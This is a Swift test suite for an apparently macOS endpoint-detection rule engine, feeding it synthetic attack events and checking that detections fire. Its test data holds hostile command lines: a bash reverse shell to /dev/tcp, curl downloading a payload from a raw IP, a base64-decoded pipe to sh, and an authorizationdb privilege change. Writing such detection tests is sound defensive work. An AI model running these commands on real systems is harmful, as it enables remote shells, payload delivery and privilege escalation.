// PipelineTests.swift
// End-to-end synthetic tests: crafted attack events → rule engine → expected detections.
// Tests that real compiled rules fire against realistic event patterns.

import Testing
import Foundation
@testable import HawkEyeCore

// MARK: - Test Event Builders

/// Create a process creation event with optional code signature.
private func processEvent(
    name: String,
    path: String,
    commandLine: String,
    parentPath: String = "/sbin/launchd",
    parentName: String = "launchd",
    signer: SignerType? = nil,
    user: String = "testuser",
    uid: UInt32 = 501
) -> Event {
    let codeSig: CodeSignatureInfo? = signer.map {
        CodeSignatureInfo(signerType: $0, teamId: nil, signingId: nil, authorities: [], flags: 0, isNotarized: false)
    }
    let process = ProcessInfo(
        pid: Int32.random(in: 1000...60000),
        ppid: Int32.random(in: 1...999),
        rpid: 1,
        name: name,
        executable: path,
        commandLine: commandLine,
        args: commandLine.split(separator: " ").map(String.init),
        workingDirectory: "/tmp",
        userId: uid,
        userName: user,
        groupId: 20,
        startTime: Date(),
        codeSignature: codeSig,
        ancestors: [ProcessAncestor(pid: 1, executable: parentPath, name: parentName)],
        architecture: "arm64",
        isPlatformBinary: signer == .apple
    )
    return Event(eventCategory: .process, eventType: .creation, eventAction: "exec", process: process)
}

/// Create a file event.
private func fileEvent(
    filePath: String,
    action: FileAction = .create,
    processPath: String = "/usr/bin/touch",
    processName: String = "touch",
    signer: SignerType? = nil
) -> Event {
    let codeSig: CodeSignatureInfo? = signer.map {
        CodeSignatureInfo(signerType: $0, teamId: nil, signingId: nil, authorities: [], flags: 0, isNotarized: false)
    }
    let process = ProcessInfo(
        pid: Int32.random(in: 1000...60000), ppid: 1, rpid: 1,
        name: processName, executable: processPath, commandLine: "\(processPath) \(filePath)",
        args: [processPath, filePath], workingDirectory: "/",
        userId: 501, userName: "testuser", groupId: 20, startTime: Date(),
        codeSignature: codeSig,
        ancestors: [ProcessAncestor(pid: 1, executable: "/sbin/launchd", name: "launchd")],
        architecture: "arm64", isPlatformBinary: false
    )
    let file = FileInfo(path: filePath, action: action)
    return Event(eventCategory: .file, eventType: .creation, eventAction: action.rawValue, process: process, file: file)
}

/// Create a network connection event.
private func networkEvent(
    processPath: String = "/usr/bin/curl",
    processName: String = "curl",
    destIp: String,
    destPort: UInt16,
    transport: String = "tcp"
) -> Event {
    let process = ProcessInfo(
        pid: Int32.random(in: 1000...60000), ppid: 1, rpid: 1,
        name: processName, executable: processPath, commandLine: processPath,
        args: [processPath], workingDirectory: "/",
        userId: 501, userName: "testuser", groupId: 20, startTime: Date(),
        ancestors: [ProcessAncestor(pid: 1, executable: "/sbin/launchd", name: "launchd")],
        architecture: "arm64", isPlatformBinary: false
    )
    let net = NetworkInfo(
        sourceIp: "192.168.1.100", sourcePort: UInt16.random(in: 49152...65535),
        destinationIp: destIp, destinationPort: destPort,
        direction: .outbound, transport: transport
    )
    return Event(eventCategory: .network, eventType: .connection, eventAction: "connect", process: process, network: net)
}

/// Create a TCC permission event.
private func tccEvent(
    service: String,
    client: String,
    clientPath: String,
    allowed: Bool,
    signer: SignerType? = nil
) -> Event {
    let codeSig: CodeSignatureInfo? = signer.map {
        CodeSignatureInfo(signerType: $0, teamId: nil, signingId: nil, authorities: [], flags: 0, isNotarized: false)
    }
    let process = ProcessInfo(
        pid: Int32.random(in: 1000...60000), ppid: 1, rpid: 1,
        name: (clientPath as NSString).lastPathComponent, executable: clientPath,
        commandLine: clientPath, args: [clientPath], workingDirectory: "/",
        userId: 501, userName: "testuser", groupId: 20, startTime: Date(),
        codeSignature: codeSig,
        ancestors: [ProcessAncestor(pid: 1, executable: "/sbin/launchd", name: "launchd")],
        architecture: "arm64", isPlatformBinary: false
    )
    let tcc = TCCInfo(service: service, client: client, clientPath: clientPath, allowed: allowed, authReason: "user_consent")
    return Event(eventCategory: .tcc, eventType: .change, eventAction: "grant", process: process, tcc: tcc)
}

/// Load all compiled rules into a fresh engine.
private func loadAllRules() async throws -> RuleEngine {
    let compiledDir = "/tmp/hawkeye_v3"
    if !FileManager.default.fileExists(atPath: compiledDir) {
        // Compile if not already done
        let projectDir = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
        let proc = Process()
        proc.executableURL = URL(fileURLWithPath: "/usr/bin/python3")
        proc.arguments = [
            projectDir.appendingPathComponent("Compiler/compile_rules.py").path,
            "--input-dir", projectDir.appendingPathComponent("Rules").path,
            "--output-dir", compiledDir,
        ]
        proc.standardOutput = FileHandle.nullDevice
        proc.standardError = FileHandle.nullDevice
        try proc.run()
        proc.waitUntilExit()
    }
    let engine = RuleEngine()
    let count = try await engine.loadRules(from: URL(fileURLWithPath: compiledDir))
    #expect(count > 150, "Expected 150+ rules, got \(count)")
    return engine
}


// MARK: - Process Creation Detection Tests

@Suite("Pipeline: Process Creation Rules")
struct ProcessCreationPipelineTests {

    @Test("Detects security authorizationdb modification")
    func authorizationdbModify() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "security", path: "/usr/bin/security",
            commandLine: "security authorizationdb write system.privilege.admin allow"
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("authorization") },
                "Expected authorization rule to match, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects reverse shell pattern (bash -i)")
    func reverseShell() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "bash", path: "/bin/bash",
            commandLine: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            parentPath: "/usr/bin/python3", parentName: "python3"
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("reverse shell") },
                "Expected reverse shell rule, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects osascript execution")
    func osascriptExec() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "osascript", path: "/usr/bin/osascript",
            commandLine: "osascript -e 'do shell script \"whoami\"'"
        )
        let matches = await engine.evaluate(event)
        #expect(!matches.isEmpty, "Expected osascript detection, got none")
    }

    @Test("Detects curl to raw IP address")
    func curlToRawIP() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "curl", path: "/usr/bin/curl",
            commandLine: "curl http://185.220.101.42/payload -o /tmp/payload"
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("raw ip") },
                "Expected curl-to-raw-IP rule, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects shell profile modification")
    func shellProfileMod() async throws {
        let engine = try await loadAllRules()
        let event = fileEvent(
            filePath: "/Users/victim/.zshrc",
            processPath: "/usr/bin/tee", processName: "tee",
            signer: .unsigned
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("shell profile") },
                "Expected shell profile rule, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects sudo from suspicious parent")
    func sudoSuspicious() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "sudo", path: "/usr/bin/sudo",
            commandLine: "sudo -S /tmp/escalate",
            parentPath: "/usr/bin/python3", parentName: "python3"
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("sudo") },
                "Expected sudo detection, got: \(matches.map(\.ruleName))")
    }

    @Test("Does NOT detect normal ls command")
    func normalLs() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "ls", path: "/bin/ls",
            commandLine: "ls -la /Users/testuser",
            parentPath: "/Applications/Terminal.app/Contents/MacOS/Terminal",
            signer: .apple
        )
        let matches = await engine.evaluate(event)
        #expect(matches.isEmpty, "ls should not trigger any rules, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects base64 decode and execute")
    func base64DecodeExec() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "bash", path: "/bin/bash",
            commandLine: "bash -c 'echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0Jw== | base64 -D | sh'"
        )
        let matches = await engine.evaluate(event)
        #expect(!matches.isEmpty, "Expected base64 decode detection")
    }

    @Test("Detects unsigned binary execution from Downloads")
    func unsignedFromDownloads() async throws {
        let engine = try await loadAllRules()
        let event = processEvent(
            name: "payload", path: "/Users/victim/Downloads/payload",
            commandLine: "/Users/victim/Downloads/payload --install",
            signer: .unsigned
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("unsigned") || $0.ruleName.lowercased().contains("download") },
                "Expected unsigned-from-downloads detection, got: \(matches.map(\.ruleName))")
    }
}

// MARK: - File Event Detection Tests

@Suite("Pipeline: File Event Rules")
struct FileEventPipelineTests {

    @Test("Detects LaunchAgent creation by unsigned process")
    func launchAgentCreation() async throws {
        let engine = try await loadAllRules()
        let event = fileEvent(
            filePath: "/Users/victim/Library/LaunchAgents/com.evil.persist.plist",
            processPath: "/tmp/dropper", processName: "dropper",
            signer: .unsigned
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("launch") },
                "Expected LaunchAgent detection, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects LaunchDaemon creation")
    func launchDaemonCreation() async throws {
        let engine = try await loadAllRules()
        let event = fileEvent(
            filePath: "/Library/LaunchDaemons/com.evil.persist.plist",
            processPath: "/tmp/installer", processName: "installer",
            signer: .unsigned
        )
        let matches = await engine.evaluate(event)
        #expect(!matches.isEmpty, "Expected LaunchDaemon detection")
    }

    @Test("Detects cron job modification by non-crontab process")
    func cronModification() async throws {
        let engine = try await loadAllRules()
        let event = fileEvent(
            filePath: "/private/var/at/tabs/root",
            processPath: "/tmp/backdoor", processName: "backdoor",
            signer: .unsigned
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("cron") },
                "Expected cron job detection, got: \(matches.map(\.ruleName))")
    }

    @Test("Does NOT detect normal file write in home dir")
    func normalFileWrite() async throws {
        let engine = try await loadAllRules()
        let event = fileEvent(
            filePath: "/Users/testuser/Documents/notes.txt",
            processPath: "/Applications/TextEdit.app/Contents/MacOS/TextEdit",
            processName: "TextEdit", signer: .apple
        )
        let matches = await engine.evaluate(event)
        #expect(matches.isEmpty, "Normal file write should not trigger rules, got: \(matches.map(\.ruleName))")
    }
}

// MARK: - Network Connection Detection Tests

@Suite("Pipeline: Network Connection Rules")
struct NetworkPipelineTests {

    @Test("Detects connection to cloud metadata service")
    func cloudMetadata() async throws {
        let engine = try await loadAllRules()
        let event = networkEvent(
            processPath: "/tmp/recon", processName: "recon",
            destIp: "169.254.169.254", destPort: 80
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("metadata") },
                "Expected IMDS detection, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects Tor SOCKS proxy connection")
    func torConnection() async throws {
        let engine = try await loadAllRules()
        let event = networkEvent(destIp: "127.0.0.1", destPort: 9050)
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("tor") },
                "Expected Tor detection, got: \(matches.map(\.ruleName))")
    }
}

// MARK: - TCC Event Detection Tests

@Suite("Pipeline: TCC Event Rules")
struct TCCPipelineTests {

    @Test("Detects microphone access by unsigned process")
    func micAccessUnsigned() async throws {
        let engine = try await loadAllRules()
        let event = tccEvent(
            service: "kTCCServiceMicrophone",
            client: "com.evil.spy",
            clientPath: "/tmp/spy",
            allowed: true,
            signer: .unsigned
        )
        let matches = await engine.evaluate(event)
        #expect(matches.contains { $0.ruleName.lowercased().contains("microphone") },
                "Expected microphone access detection, got: \(matches.map(\.ruleName))")
    }

    @Test("Detects screen recording permission grant")
    func screenRecording() async throws {
        let engine = try await loadAllRules()
        let event = tccEvent(
            service: "kTCCServiceScreenCapture",
            client: "com.unknown.recorder",
            clientPath: "/Applications/Recorder.app/Contents/MacOS/Recorder",
            allowed: true,
            signer: .adHoc
        )
        let matches = await engine.evaluate(event)
        #expect(!matches.isEmpty, "Expected screen recording detection, got: \(matches.map(\.ruleName))")
    }

    @Test("Does NOT alert on Apple-signed camera access")
    func appleCameraAccess() async throws {
        let engine = try await loadAllRules()
        let event = tccEvent(
            service: "kTCCServiceCamera",
            client: "com.apple.FaceTime",
            clientPath: "/System/Applications/FaceTime.app/Contents/MacOS/FaceTime",
            allowed: true,
            signer: .apple
        )
        let matches = await engine.evaluate(event)
        // Apple-signed camera use should not trigger "unsigned process" rules
        let unsignedMatches = matches.filter { $0.ruleName.lowercased().contains("unsigned") }
        #expect(unsignedMatches.isEmpty, "Apple camera should not trigger unsigned rules")
    }
}

// MARK: - Cross-Category Coverage Test

@Suite("Pipeline: Coverage")
struct CoverageTests {

    @Test("All rule categories have at least one matching test event")
    func categoryCoverage() async throws {
        let engine = try await loadAllRules()

        // Process creation — reverse shell
        let proc = processEvent(
            name: "bash", path: "/bin/bash",
            commandLine: "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
            parentPath: "/usr/bin/python3"
        )
        let procMatches = await engine.evaluate(proc)
        #expect(!procMatches.isEmpty, "process_creation rules should fire")

        // File event — LaunchAgent
        let file = fileEvent(
            filePath: "/Users/x/Library/LaunchAgents/evil.plist",
            processPath: "/tmp/dropper", signer: .unsigned
        )
        let fileMatches = await engine.evaluate(file)
        #expect(!fileMatches.isEmpty, "file_event rules should fire")

        // Network — IMDS
        let net = networkEvent(destIp: "169.254.169.254", destPort: 80)
        let netMatches = await engine.evaluate(net)
        #expect(!netMatches.isEmpty, "network_connection rules should fire")

        // TCC — microphone
        let tcc = tccEvent(
            service: "kTCCServiceMicrophone", client: "evil",
            clientPath: "/tmp/evil", allowed: true, signer: .unsigned
        )
        let tccMatches = await engine.evaluate(tcc)
        #expect(!tccMatches.isEmpty, "tcc_event rules should fire")
    }

    @Test("SignerType field resolves correctly for unsigned binaries")
    func signerTypeResolution() async throws {
        let engine = try await loadAllRules()
        // Many rules filter on "NOT SignerType apple|appStore|devId"
        // An unsigned process doing something suspicious should match
        let event = fileEvent(
            filePath: "/Users/x/Library/LaunchAgents/persist.plist",
            processPath: "/private/tmp/malware",
            processName: "malware",
            signer: .unsigned
        )
        let matches = await engine.evaluate(event)
        #expect(!matches.isEmpty, "Unsigned process writing LaunchAgent should trigger rules")
    }
}
